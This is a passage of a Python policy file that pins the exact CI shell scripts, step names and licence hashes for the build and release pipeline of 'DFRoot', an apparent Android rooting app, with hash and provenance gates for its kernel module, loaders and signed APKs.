        'EVIDENCE="$RUNNER_TEMP/release-evidence.tsv"\n'
        'INDEX="$RUNNER_TEMP/apk-gate-index.tsv"\n'
        'LINDEX="$RUNNER_TEMP/apk-loader-index.tsv"\n'
        'STAGE="$RUNNER_TEMP/dfroot-release-apks"\n'
        'LOADER_PINS="$RUNNER_TEMP/loader-pins.tsv"\n'
        ': > "$EVIDENCE"\n'
        'field() {\n'
        '  awk -v key="$1" \'index($0, key ": ") == 1 {\n'
        '    print substr($0, length(key) + 3); exit }\' "$2"\n'
        '}\n'
        'in_pins() {\n'
        '  tr \';\' \'\\n\' < "$RUNNER_TEMP/ko-pins.txt" | grep -qx "$1"\n'
        '}\n'
        'loader_pin() {\n'
        '  awk -F \'\\t\' -v key="$1" \'$1 == key { print $2; exit }\' "$LOADER_PINS"\n'
        '}\n'
        'PIN_KSUD_SHA=$(loader_pin ksud_sha256)\n'
        'PIN_KSUD_SIZE=$(loader_pin ksud_size)\n'
        'PIN_NEXT_SHA=$(loader_pin ksudnext_sha256)\n'
        'PIN_NEXT_SIZE=$(loader_pin ksudnext_size)\n'
        'for pin_value in "$PIN_KSUD_SHA" "$PIN_KSUD_SIZE" "$PIN_NEXT_SHA" "$PIN_NEXT_SIZE"; do\n'
        '  if [ -z "$pin_value" ]; then\n'
        '    echo "::error::Loader pin is missing from $LOADER_PINS"\n'
        '    bad=1\n'
        '  fi\n'
        'done\n'
        '\n'
        '# 1. checked-out source is exactly the publishing commit.\n'
        'HEAD_SHA=$(git rev-parse HEAD)\n'
        'if [ "$HEAD_SHA" != "$GITHUB_SHA" ]; then\n'
        '  echo "::error::git HEAD $HEAD_SHA != GITHUB_SHA $GITHUB_SHA"\n'
        '  bad=1\n'
        'fi\n'
        '\n'
        '# 2. every native cache has the KO hash gate enabled (skip OFF).\n'
        'caches=$(find app/.cxx -type f -name CMakeCache.txt 2>/dev/null || true)\n'
        'if [ -z "$caches" ]; then\n'
        '  echo "::error::No CMakeCache.txt found under app/.cxx"\n'
        '  bad=1\n'
        'fi\n'
        'while IFS= read -r cache; do\n'
        '  [ -n "$cache" ] || continue\n'
        '  if ! grep -qs \'^DFROOT_SKIP_KO_HASH_CHECK:BOOL=OFF$\' "$cache"; then\n'
        '    echo "::error::DFROOT_SKIP_KO_HASH_CHECK not OFF in $cache"\n'
        '    bad=1\n'
        '  fi\n'
        'done <<< "$caches"\n'
        '\n'
        '# 3. ALL source-KO manifests are verified and pinned; no first-match\n'
        '# selection, so a stray unverified cache cannot hide in the set.\n'
        'source_manifests=0\n'
        'source_hashes=""\n'
        "while IFS= read -r -d '' koman; do\n"
        '  source_manifests=$((source_manifests + 1))\n'
        '  if ! grep -q \'^status: verified$\' "$koman"; then\n'
        '    echo "::error::KO gate manifest is not verified: $koman"\n'
        '    bad=1\n'
        '  fi\n'
        '  ko_hash=$(field sha256 "$koman")\n'
        '  if ! in_pins "$ko_hash"; then\n'
        '    echo "::error::KO manifest hash \'$ko_hash\' is not in the reviewed pins ($koman)"\n'
        '    bad=1\n'
        '  fi\n'
        '  source_hashes="$source_hashes $ko_hash"\n'
        "done < <(find app/.cxx -type f -name 'dfroot-ko.sha256.manifest' -print0 2>/dev/null)\n"
        'if [ "$source_manifests" -eq 0 ]; then\n'
        '  echo "::error::No dfroot-ko.sha256.manifest found"\n'
        '  bad=1\n'
        'fi\n'
        '\n'
        '# 4. ALL provenance records are present; identity was checked in the\n'
        '# dedicated required step above. No -print -quit selection here.\n'
        'provenance_records=0\n'
        "while IFS= read -r -d '' rec; do\n"
        '  provenance_records=$((provenance_records + 1))\n'
        '  rec_ko=$(field ko_sha256 "$rec")\n'
        '  if ! in_pins "$rec_ko"; then\n'
        '    echo "::error::Provenance ko_sha256 \'$rec_ko\' is not pinned ($rec)"\n'
        '    bad=1\n'
        '  fi\n'
        "done < <(find app/.cxx -type f -name 'dfroot-build-provenance.txt' -print0 2>/dev/null)\n"
        'if [ "$provenance_records" -eq 0 ]; then\n'
        '  echo "::error::No dfroot-build-provenance.txt found"\n'
        '  bad=1\n'
        'fi\n'
        '\n'
        '# 5. EVERY packaged-KO manifest in the native caches must be verified\n'
        '# and pinned, with so_sha256 equal to the SHA-256 of the verified\n'
        '# libdfroot.so whose path the manifest records. No first-match selection, so a stray\n'
        '# unverified cached artifact cannot hide in the set.\n'
        'packaged_manifests=0\n'
        "while IFS= read -r -d '' pman; do\n"
        '  packaged_manifests=$((packaged_manifests + 1))\n'
        '  if ! grep -q \'^status: verified$\' "$pman"; then\n'
        '    echo "::error::Packaged-KO manifest is not verified: $pman"\n'
        '    bad=1\n'
        '  fi\n'
        '  pkg_ko_hash=$(field sha256 "$pman")\n'
        '  if ! in_pins "$pkg_ko_hash"; then\n'
        '    echo "::error::Packaged-KO hash \'$pkg_ko_hash\' is not a reviewed pin ($pman)"\n'
        '    bad=1\n'
        '  fi\n'
        '  verified_so=$(field verified_so "$pman")\n'
        '  case "$verified_so" in\n'
        '    */app/build/intermediates/*/libdfroot.so) ;;\n'
        '    *)\n'
        '      echo "::error::Manifest does not name the verified packaged .so: $pman"\n'
        '      bad=1\n'
        '      ;;\n'
        '  esac\n'
        '  if [ ! -f "$verified_so" ]; then\n'
        '    echo "::error::Verified libdfroot.so missing for manifest: $pman"\n'
        '    bad=1\n'
        '  else\n'
        '    verified_so_sha=$(sha256sum "$verified_so" | awk \'{print $1}\')\n'
        '    man_so_sha=$(field so_sha256 "$pman")\n'
        '    if [ "$man_so_sha" != "$verified_so_sha" ]; then\n'
        '      echo "::error::Manifest so_sha256 \'$man_so_sha\' does not match verified libdfroot.so \'$verified_so_sha\' ($pman)"\n'
        '      bad=1\n'
        '    fi\n'
        '  fi\n'
        "done < <(find app/.cxx -type f -name 'dfroot-packaged-ko.manifest' -print0 2>/dev/null)\n"
        'if [ "$packaged_manifests" -eq 0 ]; then\n'
        '  echo "::error::No dfroot-packaged-ko.manifest found under app/.cxx"\n'
        '  bad=1\n'
        'fi\n'
        '\n'
        '# 6. One evidence row per APK in the gate index (i.e. per upload).\n'
        'if [ ! -s "$INDEX" ]; then\n'
        '  echo "::error::APK gate index is empty; no verified artifact to document"\n'
        '  bad=1\n'
        'fi\n'
        'rows=0\n'
        "while IFS=$'\\t' read -r name apk_sha so_sha pman man_so_sha; do\n"
        '  rows=$((rows + 1))\n'
        '  staged="$STAGE/$name"\n'
        '  if [ ! -f "$staged" ]; then\n'
        '    echo "::error::Staged APK missing: $staged"\n'
        '    bad=1\n'
        '    continue\n'
        '  fi\n'
        '  if [ "$(sha256sum "$staged" | awk \'{print $1}\')" != "$apk_sha" ]; then\n'
        '    echo "::error::Staged APK hash changed after the gate: $name"\n'
        '    bad=1\n'
        '  fi\n'
        '  # The packaged release APK is the exact file the upload step uses.\n'
        '  if [ "$(sha256sum "release/$name" | awk \'{print $1}\')" != "$apk_sha" ]; then\n'
        '    echo "::error::Packaged release APK hash changed after the gate: $name"\n'
        '    bad=1\n'
        '  fi\n'
        '  if [ ! -f "$pman" ] || ! grep -q \'^status: verified$\' "$pman"; then\n'
        '    echo "::error::Packaged-KO manifest for $name is missing or not verified"\n'
        '    bad=1\n'
        '    continue\n'
        '  fi\n'
        '  pkg_hash=$(field sha256 "$pman")\n'
        '  if ! in_pins "$pkg_hash"; then\n'
        '    echo "::error::Packaged KO hash \'$pkg_hash\' for $name is not a reviewed pin"\n'
        '    bad=1\n'
        '  fi\n'
        '  if [ "$man_so_sha" != "$so_sha" ]; then\n'
        '    echo "::error::Manifest so_sha256 for $name does not match the extracted .so"\n'
        '    bad=1\n'
        '  fi\n'
        '  case " $source_hashes " in\n'
        '    *" $pkg_hash "*) ;;\n'
        '    *)\n'
        '      echo "::error::Packaged KO hash for $name matches no verified source-KO manifest"\n'
        '      bad=1\n'
        '      ;;\n'
        '  esac\n'
        "  printf 'apk: %s\\tapk_sha256: %s\\tso_sha256: %s\\tpackaged_ko_sha256: %s\\tprovenance_records: %s\\tgit_sha: %s\\n' \\\n"
        '      "$name" "$apk_sha" "$so_sha" "$pkg_hash" "$provenance_records" "$HEAD_SHA" >> "$EVIDENCE"\n'
        'done < "$INDEX"\n'
        'if [ "$rows" -eq 0 ]; then\n'
        '  echo "::error::No APK evidence rows produced"\n'
        '  bad=1\n'
        'fi\n'
        'staged_count=$(find "$STAGE" -maxdepth 1 -type f -name \'DFRoot_*.apk\' 2>/dev/null | wc -l)\n'
        'if [ "$rows" -ne "$staged_count" ]; then\n'
        '  echo "::error::Evidence rows ($rows) != staged APK count ($staged_count)"\n'
        '  bad=1\n'
        'fi\n'
        '\n'
        '# 7. Bundled loader bytes: every build-time loader manifest must be\n'
        '# verified and pinned (three-way binding with the reviewed pins), and\n'
        '# every APK in the loader gate index must re-hash to the staged and\n'
        '# packaged APK, match the KO gate index, and carry pinned hashes that\n'
        '# agree with its own manifest and with a verified build-time manifest.\n'
        'loader_manifests=0\n'
        'build_loader_hashes=""\n'
        "while IFS= read -r -d '' lman; do\n"
        '  loader_manifests=$((loader_manifests + 1))\n'
        '  if ! grep -q \'^status: verified$\' "$lman"; then\n'
        '    echo "::error::Loader gate manifest is not verified: $lman"\n'
        '    bad=1\n'
        '  fi\n'
        '  for pair in \\\n'
        '      "ksud_sha256|$PIN_KSUD_SHA" \\\n'
        '      "ksud_size|$PIN_KSUD_SIZE" \\\n'
        '      "ksudnext_sha256|$PIN_NEXT_SHA" \\\n'
        '      "ksudnext_size|$PIN_NEXT_SIZE"; do\n'
        '    key=${pair%%|*}\n'
        '    want=${pair#*|}\n'
        '    got=$(field "$key" "$lman")\n'
        '    if [ "$got" != "$want" ]; then\n'
        '      echo "::error::Loader manifest $key \'$got\' is not the reviewed pin \'$want\' ($lman)"\n'
        '      bad=1\n'
        '    fi\n'
        '  done\n'
        '  build_loader_hashes="$build_loader_hashes $(field ksud_sha256 "$lman")/$(field ksudnext_sha256 "$lman")"\n'
        "done < <(find app/.cxx -type f -name 'loader-hashes.manifest' -print0 2>/dev/null)\n"
        'if [ "$loader_manifests" -eq 0 ]; then\n'
        '  echo "::error::No loader-hashes.manifest found under app/.cxx"\n'
        '  bad=1\n'
        'fi\n'
        '\n'
        'if [ ! -s "$LINDEX" ]; then\n'
        '  echo "::error::APK loader index is empty; no verified loader artifact to document"\n'
        '  bad=1\n'
        'fi\n'
        'loader_rows=0\n'
        "while IFS=$'\\t' read -r name apk_sha ksud_sha next_sha lman; do\n"
        '  loader_rows=$((loader_rows + 1))\n'
        '  staged="$STAGE/$name"\n'
        '  if [ ! -f "$staged" ]; then\n'
        '    echo "::error::Staged APK missing for loader evidence: $staged"\n'
        '    bad=1\n'
        '    continue\n'
        '  fi\n'
        '  if [ "$(sha256sum "$staged" | awk \'{print $1}\')" != "$apk_sha" ]; then\n'
        '    echo "::error::Staged APK hash changed after the loader gate: $name"\n'
        '    bad=1\n'
        '  fi\n'
        '  if [ "$(sha256sum "release/$name" | awk \'{print $1}\')" != "$apk_sha" ]; then\n'
        '    echo "::error::Packaged release APK hash changed after the loader gate: $name"\n'
        '    bad=1\n'
        '  fi\n'
        '  if ! awk -F \'\\t\' -v n="$name" -v s="$apk_sha" \\\n'
        '         \'$1 == n && $2 == s { found = 1 } END { exit(found ? 0 : 1) }\' "$INDEX"; then\n'
        '    echo "::error::APK $name loader evidence does not match the KO gate index"\n'
        '    bad=1\n'
        '  fi\n'
        '  if [ ! -f "$lman" ] || ! grep -q \'^status: verified$\' "$lman"; then\n'
        '    echo "::error::Loader manifest for $name is missing or not verified"\n'
        '    bad=1\n'
        '    continue\n'
        '  fi\n'
        '  for pair in \\\n'
        '      "ksud_sha256|$PIN_KSUD_SHA" \\\n'
        '      "ksud_size|$PIN_KSUD_SIZE" \\\n'
        '      "ksudnext_sha256|$PIN_NEXT_SHA" \\\n'
        '      "ksudnext_size|$PIN_NEXT_SIZE"; do\n'
        '    key=${pair%%|*}\n'
        '    want=${pair#*|}\n'
        '    got=$(field "$key" "$lman")\n'
        '    if [ "$got" != "$want" ]; then\n'
        '      echo "::error::Loader manifest $key \'$got\' for $name is not the reviewed pin \'$want\'"\n'
        '      bad=1\n'
        '    fi\n'
        '  done\n'
        '  if [ "$ksud_sha" != "$PIN_KSUD_SHA" ] || [ "$next_sha" != "$PIN_NEXT_SHA" ]; then\n'
        '    echo "::error::Loader hashes for $name are not the reviewed pins"\n'
        '    bad=1\n'
        '  fi\n'
        '  if [ "$(field ksud_sha256 "$lman")" != "$ksud_sha" ] ||\n'
        '     [ "$(field ksudnext_sha256 "$lman")" != "$next_sha" ]; then\n'
        '    echo "::error::Loader manifest for $name does not match the indexed APK hashes"\n'
        '    bad=1\n'
        '  fi\n'
        '  case " $build_loader_hashes " in\n'
        '    *" $ksud_sha/$next_sha "*) ;;\n'
        '    *)\n'
        '      echo "::error::Loader hashes for $name match no verified build-time manifest"\n'
        '      bad=1\n'
        '      ;;\n'
        '  esac\n'
        "  printf 'apk: %s\\tloader_ksud_sha256: %s\\tloader_ksudnext_sha256: %s\\tloader_manifest: %s\\n' \\\n"
        '      "$name" "$ksud_sha" "$next_sha" "$lman" >> "$EVIDENCE"\n'
        'done < "$LINDEX"\n'
        'if [ "$loader_rows" -eq 0 ]; then\n'
        '  echo "::error::No APK loader evidence rows produced"\n'
        '  bad=1\n'
        'fi\n'
        'if [ "$loader_rows" -ne "$staged_count" ]; then\n'
        '  echo "::error::Loader evidence rows ($loader_rows) != staged APK count ($staged_count)"\n'
        '  bad=1\n'
        'fi\n'
        'cat "$EVIDENCE"\n'
        '\n'
        'if [ "$bad" -ne 0 ]; then\n'
        '  echo "::error::Release evidence checks failed; blocking upload/release"\n'
        '  exit 1\n'
        'fi\n'
        'echo "release-evidence-ok" > "$RUNNER_TEMP/marker-release-evidence"'
    ),
    'Assert distributable evidence before upload': (
        'set -euo pipefail\n'
        'missing=0\n'
        'for marker in marker-apk-gate marker-provenance-identity \\\n'
        '              marker-release-evidence; do\n'
        '  if [ ! -s "$RUNNER_TEMP/$marker" ]; then\n'
        '    echo "::error::Distributable evidence marker missing: $marker"\n'
        '    missing=1\n'
        '  fi\n'
        'done\n'
        'if [ ! -s "$RUNNER_TEMP/apk-gate-index.tsv" ]; then\n'
        '  echo "::error::APK gate index is empty or missing"\n'
        '  missing=1\n'
        'fi\n'
        'if [ ! -s "$RUNNER_TEMP/apk-loader-index.tsv" ]; then\n'
        '  echo "::error::APK loader index is empty or missing"\n'
        '  missing=1\n'
        'fi\n'
        'if [ "$missing" -ne 0 ]; then exit 1; fi\n'
        'echo "distributable-evidence-ok" > "$RUNNER_TEMP/marker-distributable-evidence"\n'
        'echo "All distributable evidence gates reached (3/3 markers + nonempty KO/loader indexes)"'
    ),
    'Generate APK provenance manifest (informational)': (
        'set -uo pipefail\n'
        'OUT="$RUNNER_TEMP/dfroot-apk-provenance.txt"\n'
        'hash_one() {\n'
        '  if [ -f "$1" ]; then\n'
        '    sha256sum "$1" || echo "unavailable (sha256sum failed): $1"\n'
        '  else\n'
        '    echo "unavailable (missing): $1"\n'
        '  fi\n'
        '}\n'
        '{\n'
        '  echo "# DFRoot APK provenance (informational audit bundle; not an attestation, not an independent reproducible-build proof, not a release gate)"\n'
        '  echo "git_sha: $GITHUB_SHA"\n'
        '  echo "generated_utc: $(date -u +%Y-%m-%dT%H:%M:%SZ)"\n'
        '  echo "cmake: $(cmake --version 2>/dev/null | head -1 || echo unavailable)"\n'
        '  echo "java: $(java -version 2>&1 | head -1 || echo unavailable)"\n'
        '  echo "clang: $(clang --version 2>/dev/null | head -1 || echo unavailable)"\n'
        '  if [ -n "${ANDROID_NDK_HOME:-}" ] && [ -f "$ANDROID_NDK_HOME/source.properties" ]; then\n'
        '    grep \'^Pkg.Revision=\' "$ANDROID_NDK_HOME/source.properties" || true\n'
        '  else\n'
        '    echo "ndk: unavailable (ANDROID_NDK_HOME not set)"\n'
        '  fi\n'
        '  echo "--- artifacts (staged, gate-verified) ---"\n'
        '  for apk in "$RUNNER_TEMP"/dfroot-release-apks/DFRoot_*.apk; do hash_one "$apk"; done\n'
        '  hash_one app/src/main/jni/ko/dfroot-android13-5.15.ko\n'
        '  hash_one app/src/main/jniLibs/arm64-v8a/libksud.so\n'
        '  hash_one app/src/main/jniLibs/arm64-v8a/libksudnext.so\n'
        '  find app/.cxx -type f -name splicehelper -print0 2>/dev/null |\n'
        '    while IFS= read -r -d \'\' f; do hash_one "$f"; done\n'
        '  echo "--- KO gate manifest ---"\n'
        "  find app/.cxx -type f -name 'dfroot-ko.sha256.manifest' -print0 2>/dev/null |\n"
        '    while IFS= read -r -d \'\' f; do echo "file: $f"; cat "$f"; done\n'
        '} > "$OUT"\n'
        'cat "$OUT"'
    ),
    'Clean up signing material': (
        'rm -f -- signing.properties keystore.jks .keystore.jks-*.tmp .signing.properties-*.tmp'
    ),
}

# Exact, ordered run-script contract for the UNCONDITIONAL host-gates job.
# The JUnit step's pinned Python heredoc is the only heredoc the strict parser
# permits, and only because its text is locked here.
HOST_GATES_RUN_SCRIPTS: dict[str, str] = {
    CHECKOUT_SHA_STEP: CHECKOUT_SHA_SCRIPT,
    'Host status-protocol tests': (
        'set -euo pipefail\n'
        'make -C tests/native test\n'
        'echo "native-ok" > "$RUNNER_TEMP/marker-native"'
    ),
    'KO hash policy tests (CMake, host-only)': (
        'set -euo pipefail\n'
        'cmake -P tests/cmake/ko_hash_policy_test.cmake\n'
        'echo "ko-policy-ok" > "$RUNNER_TEMP/marker-ko-policy"'
    ),
    'Packaged-KO byte-gate tests (CMake, host-only)': (
        'set -euo pipefail\n'
        'cmake -P tests/cmake/packaged_ko_test.cmake\n'
        '# Same step, same single marker: the named/ALL/raw/cached target\n'
        '# graph is exercised by a harmless host fixture harness.\n'
        'cmake -P tests/cmake/packaging_target_graph_test.cmake\n'
        'echo "packaged-ko-ok" > "$RUNNER_TEMP/marker-packaged-ko"'
    ),
    'APK packaging gate fixture tests (CMake, host-only)': (
        'set -euo pipefail\n'
        'cmake -P tests/cmake/apk_packaging_gate_test.cmake\n'
        '# Harmless host content gate: libbootstrap.so must be staged at the\n'
        '# exact ABI path. Same step and same single marker (7/7 stays intact).\n'
        'cmake -P tests/cmake/apk_content_gate_test.cmake\n'
        '# Harmless host gate for the bundled loader SHA-256/size pins. Same\n'
        '# step and same single marker (7/7 stays intact); no loader is run.\n'
        'cmake -P tests/cmake/loader_hash_test.cmake\n'
        'echo "apk-packaging-fixture-ok" > "$RUNNER_TEMP/marker-apk-packaging-fixture"'
    ),
    'Extract reviewed KO pins and sizes': (
        'set -euo pipefail\n'
        "sed -n '/set(KO_EXPECTED_SHA256S/,/^)/p' app/src/main/jni/CMakeLists.txt \\\n"
        '  | grep -oE \'[0-9a-f]{64}\' | paste -sd\';\' - > "$RUNNER_TEMP/ko-pins.txt"\n'
        "sed -n '/set(KO_EXPECTED_SIZES/,/^)/p' app/src/main/jni/CMakeLists.txt \\\n"
        '  | grep -oE \'[0-9]+\' | paste -sd\';\' - > "$RUNNER_TEMP/ko-sizes.txt"\n'
        'test -s "$RUNNER_TEMP/ko-pins.txt"\n'
        'test -s "$RUNNER_TEMP/ko-sizes.txt"\n'
        'echo "reviewed pins: $(cat "$RUNNER_TEMP/ko-pins.txt")"\n'
        'echo "reviewed sizes: $(cat "$RUNNER_TEMP/ko-sizes.txt")"'
    ),
    'KO hash policy (CI enforced, skip rejected)': (
        'set -euo pipefail\n'
        'SCRIPT=app/src/main/jni/verify_ko_sha256.cmake\n'
        'KO=app/src/main/jni/ko/dfroot-android13-5.15.ko\n'
        'STAMP="$RUNNER_TEMP/dfroot-ko.sha256.verified"\n'
        'MANIFEST="$RUNNER_TEMP/dfroot-ko.sha256.manifest"\n'
        'PINS=$(cat "$RUNNER_TEMP/ko-pins.txt")\n'
        'test -n "$PINS"\n'
        'CI=true cmake -DKO_FILE="$KO" "-DKO_EXPECTED_SHA256S=$PINS" \\\n'
        '    -DKO_STAMP="$STAMP" -DKO_VERIFY_MANIFEST="$MANIFEST" \\\n'
        '    -DDFROOT_BUILD_TYPE=Release -DDFROOT_ANDROID_VARIANT=release -P "$SCRIPT"\n'
        'if CI=true cmake -DKO_FILE="$KO" "-DKO_EXPECTED_SHA256S=$PINS" \\\n'
        '       -DKO_STAMP="$STAMP" -DKO_VERIFY_MANIFEST="$MANIFEST" \\\n'
        '       -DDFROOT_BUILD_TYPE=Debug -DDFROOT_SKIP=ON \\\n'
        '       -DDFROOT_SKIP_REASON=\'negative CI policy check\' -P "$SCRIPT"; then\n'
        '  echo "::error::KO hash skip unexpectedly passed under CI=true"\n'
        '  exit 1\n'
        'fi\n'
        '# Variant authority: with no automation marker and a stale Debug\n'
        '# build type, an Android release variant must still reject skip.\n'
        'if env -u CI -u GITHUB_ACTIONS -u DFROOT_RELEASE \\\n'
        '       cmake -DKO_FILE="$KO" "-DKO_EXPECTED_SHA256S=$PINS" \\\n'
        '       -DKO_STAMP="$STAMP" -DKO_VERIFY_MANIFEST="$MANIFEST" \\\n'
        '       -DDFROOT_BUILD_TYPE=Debug -DDFROOT_ANDROID_VARIANT=release \\\n'
        "       -DDFROOT_SKIP=ON -DDFROOT_SKIP_REASON='negative variant policy check' \\\n"
        '       -P "$SCRIPT"; then\n'
        '  echo "::error::KO hash skip unexpectedly passed for release variant"\n'
        '  exit 1\n'
        'fi\n'
        'echo "KO hash policy OK: verified under CI, skip rejected, release variant authoritative"\n'
        'echo "ko-ci-policy-ok" > "$RUNNER_TEMP/marker-ko-ci-policy"'
    ),
    'Java preference-persistence unit tests': (
        'set -euo pipefail\n'
        './gradlew :app:testDebugUnitTest\n'
        'echo "jvm-ok" > "$RUNNER_TEMP/marker-jvm"'
    ),
    'Assert JUnit XML (39 tests, 0 failures)': (
        'set -euo pipefail\n'
        "python3 - <<'PY'\n"
        'import glob\n'
        'import xml.etree.ElementTree as ET\n'
        '\n'
        'files = sorted(glob.glob("app/build/test-results/testDebugUnitTest/TEST-*.xml"))\n'
        'if not files:\n'
        '    raise SystemExit("::error::No JUnit XML found for testDebugUnitTest")\n'
        'tests = failures = errors = skipped = 0\n'
        'for path in files:\n'
        '    root = ET.parse(path).getroot()\n'
        '    tests += int(root.get("tests", 0))\n'
        '    failures += int(root.get("failures", 0))\n'
        '    errors += int(root.get("errors", 0))\n'
        '    skipped += int(root.get("skipped", 0))\n'
        '    print("report %s: tests=%s failures=%s errors=%s skipped=%s" %\n'
        '          (path, root.get("tests"), root.get("failures"),\n'
        '           root.get("errors"), root.get("skipped")))\n'
        'print("TOTAL tests=%d failures=%d errors=%d skipped=%d" %\n'
        '      (tests, failures, errors, skipped))\n'
        'if tests != 39 or failures != 0 or errors != 0 or skipped != 0:\n'
        '    raise SystemExit("::error::JUnit XML assertion failed: expected 39 tests, 0 failures/errors/skips")\n'
        'PY\n'
        'echo "junit-ok" > "$RUNNER_TEMP/marker-junit"'
    ),
    'Assert all test suites reached': (
        'set -euo pipefail\n'
        'missing=0\n'
        'for marker in marker-native marker-ko-policy marker-packaged-ko \\\n'
        '              marker-apk-packaging-fixture marker-ko-ci-policy \\\n'
        '              marker-jvm marker-junit; do\n'
        '  if [ ! -s "$RUNNER_TEMP/$marker" ]; then\n'
        '    echo "::error::Test suite marker missing: $marker"\n'
        '    missing=1\n'
        '  fi\n'
        'done\n'
        'if [ "$missing" -ne 0 ]; then exit 1; fi\n'
        'echo "All native/CMake/JVM suites reached (7/7 markers)"'
    ),
}

# Exact, ordered run-script contract for build-dfroot: a Debug compile/content
# gate, the CMakeCache assertion, the APK counter and the evidence-only scope
# report. No host suite, no release build and no APK may appear here.
DFROOT_RUN_SCRIPTS: dict[str, str] = {
    DEBUG_BUILD_STEP: (
        'set -euo pipefail\n'
        'for attempt in 1 2 3; do\n'
        '  if ./gradlew :app:assembleDebug --no-daemon --console=plain; then\n'
        '    break\n'
        '  fi\n'
        '  if [[ $attempt -eq 3 ]]; then\n'
        '    echo "Gradle build failed after 3 attempts" >&2\n'
        '    exit 1\n'
        '  fi\n'
        '  echo "Gradle build failed (attempt $attempt), retrying in 30s..." >&2\n'
        '  sleep 30\n'
        'done'
    ),
    'Assert KO hash check enabled in every CMakeCache': (
        'set -euo pipefail\n'
        '# Check ALL configured caches, not just one: a stray cached config\n'
        '# with DFROOT_SKIP_KO_HASH_CHECK=ON must fail the build too.\n'
        'caches=$(find app/.cxx -type f -name CMakeCache.txt 2>/dev/null || true)\n'
        'if [ -z "$caches" ]; then\n'
        '  echo "::error::No CMakeCache.txt found under app/.cxx"\n'
        '  exit 1\n'
        'fi\n'
        'bad=0\n'
        'while IFS= read -r cache; do\n'
        '  if ! grep -qs \'^DFROOT_SKIP_KO_HASH_CHECK:BOOL=OFF$\' "$cache"; then\n'
        '    echo "::error::DFROOT_SKIP_KO_HASH_CHECK is not OFF in $cache"\n'
        '    bad=1\n'
        '  fi\n'
        'done <<< "$caches"\n'
        'if [ "$bad" -ne 0 ]; then\n'
        '  exit 1\n'
        'fi\n'
        'echo "DFROOT_SKIP_KO_HASH_CHECK:BOOL=OFF confirmed in all CMakeCache files"'
    ),
    'Verify APK counts': (
        'set -euo pipefail\n'
        'shopt -s nullglob\n'
        'debug=(app/build/outputs/apk/debug/DFRoot_*.apk)\n'
        'if [[ ${#debug[@]} -ne 1 ]]; then\n'
        '  echo "Expected exactly one debug APK" >&2\n'
        '  exit 1\n'
        'fi\n'
        '# Required native content: ExploitRunner stages libbootstrap.so from\n'
        '# nativeLibraryDir at runtime. This host-only zip assertion catches a\n'
        '# Gradle named-target list that omits `bootstrap`.\n'
        'if ! python3 -c \'import sys, zipfile; z = zipfile.ZipFile(sys.argv[1]); n = "lib/arm64-v8a/libbootstrap.so"; sys.exit(0 if n in z.namelist() and z.getinfo(n).file_size > 0 else 1)\' "${debug[0]}"; then\n'
        '  echo "::error::Debug APK is missing lib/arm64-v8a/libbootstrap.so"\n'
        '  exit 1\n'
        'fi'
    ),
    CI_SCOPE_STEP: (
        '{\n'
        '  echo "## CI evidence artifact scope"\n'
        '  echo "The DFRoot-CI-evidence artifact contains only the GPLv3 licence/notices bundle. NO APK is distributed from pull requests, branches or manual runs: the Debug APK is a compile/content gate only and is never uploaded, signed with release material or published."\n'
        '  echo "Host suites (61 status, 23/25/3/7/6/16 CMake cases across six suites [KO policy / packaged-KO / APK packaging / APK content / target graph / loader hash], 39 JVM tests, 7/7 markers) ran as unconditional required gates in host-gates on every event, including tags. The real packaged-KO, provenance-identity and release-evidence gates and the signed APK belong to the protected tag publishing path (build-release) and are not claimed by this artifact. A passing host gate is not device validation; this evidence bundle is explicitly UNVERIFIED and makes no release claim."\n'
        '} >> "$GITHUB_STEP_SUMMARY"'
    ),
}

# Exact ordered step-name contract for every job.  An extra (or reordered, or
# renamed) step is a policy violation, not a harmless addition.
JOB_STEP_NAMES: dict[str, list[str]] = {
    "test-ci": [
        "Check out source",
        "Set up Java 21",
        "Set up Gradle",
        "Run signing regression tests",
        "Run signed and unsigned release smoke",
        "Run workflow policy tests",
        "Run make contract tests",
    ],
    "build-lkms": [
        "Check out source",
        "Build dfroot.ko",
        "Upload dfroot.ko",
    ],
    HOST_GATES_JOB: [
        "Check out source",
        CHECKOUT_SHA_STEP,
        "Set up Java 21",
        "Download DF LKM (android13-5.15)",
        "Set up Gradle",
        HOST_STATUS_STEP,
        KO_POLICY_TEST_STEP,
        PACKAGED_KO_TEST_STEP,
        APK_FIXTURE_TEST_STEP,
        EXTRACT_PINS_STEP,
        KO_CI_POLICY_STEP,
        JVM_TEST_STEP,
        JUNIT_STEP,
        ALL_MARKERS_STEP,
    ],
    "build-dfroot": [
        "Check out source",
        "Set up Java 21",
        "Download DF LKM (android13-5.15)",
        "Set up Gradle",
        DEBUG_BUILD_STEP,
        CI_CACHE_ASSERT_STEP,
        APK_COUNTER_COMMAND,
        CI_SCOPE_STEP,
        CI_UPLOAD_STEP,
    ],
    "build-release": [
        "Check out release history",
        ANCESTRY_STEP,
        "Set up Java 21",
        "Write signing material",
        "Download DF LKM (android13-5.15)",
        "Set up Gradle",
        "Build signed release APK",
        "Verify signed release APK",
        "Package signed release APK",
        EXTRACT_PINS_STEP,
        PACKAGED_KO_GATE_STEP,
        APK_LOADER_GATE_STEP,
        PROVENANCE_IDENTITY_STEP,
        CI_CACHE_ASSERT_STEP,
        RELEASE_EVIDENCE_STEP,
        UPLOAD_CHOKE_STEP,
        RELEASE_UPLOAD_STEP,
        PROVENANCE_GENERATE_STEP,
        PROVENANCE_UPLOAD_STEP,
        CLEANUP_STEP,
    ],
    "publish": [
        "Download signed release",
        "Verify release checksum",
        "Publish release assets",
    ],
}
# Exact multiline artifact paths/files.  These are compared with equality, so
# appending an extra file (e.g. signing.properties) is a hard failure.
CI_EVIDENCE_UPLOAD_PATH = (
    "GPL-3.0.txt\n"
    "LICENSE\n"
    "NOTICE\n"
    "THIRD_PARTY_NOTICES.md"
)
# No APK may ever be distributed from PR/branch/manual events. This is an
# evidence-only bundle; the Debug APK is a compile/content gate, not a product.
# Licence/notices also accompany the signed release assets; the repository's
# own GPL-2.0 LICENSE is one of them.
LICENSE_ASSETS = ("GPL-3.0.txt", "LICENSE", "NOTICE", "THIRD_PARTY_NOTICES.md")
# Byte-exact pin of the verbatim official text from gnu.org; any edit to the
# conveyed licence (or a truncated/substituted copy) is a policy violation.
GPL_SHA256 = "3972dc9744f6499f0f9b2dbf76696f2ae7ad8af9b23dde66d6af86c9dfb36986"
# Byte-exact pin of the repository's verbatim GPL-2.0 LICENSE.  The unsigned CI
# artifact is downloadable by anyone from this public repository, so this file
# is conveyed too and must not be silently edited or replaced.
LICENSE_SHA256 = "81d2e2140695d3a3c76c1fa48b8fc34abfee067f6197812c3e842612be5c3ff6"
